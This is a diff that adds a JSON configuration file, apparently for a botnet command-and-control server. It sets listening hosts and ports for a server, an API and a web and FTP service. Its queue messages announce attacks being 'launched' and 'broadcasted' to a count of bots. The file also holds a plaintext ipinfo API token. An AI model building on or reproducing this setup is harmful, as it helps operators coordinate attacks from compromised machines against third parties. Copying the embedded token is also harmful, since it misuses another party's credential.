@@ -1,0 +1,23 @@
+{
+  "server": {
+    "host": "0.0.0.0",
+    "port": 6621
+  },
+  "api": {
+    "enabled": true,
+    "host": "0.0.0.0",
+    "port": 30120
+  },
+  "webserver": {
+    "enabled": true,
+    "http": 80,
+    "http2": 8080,
+    "ftp": 21,
+    "ftp2": 8021
+  },
+  "queue": {
+    "queuedMessage": "Attack has been queued in spot <<$pos>>. It will be launched in <<$waittime>> seconds.",
+    "broadcastMessage": "Queued attack has been broadcasted to <<$botcount>> bots"
+  },
+  "ipInfoToken": "96c2f066646363"
+}
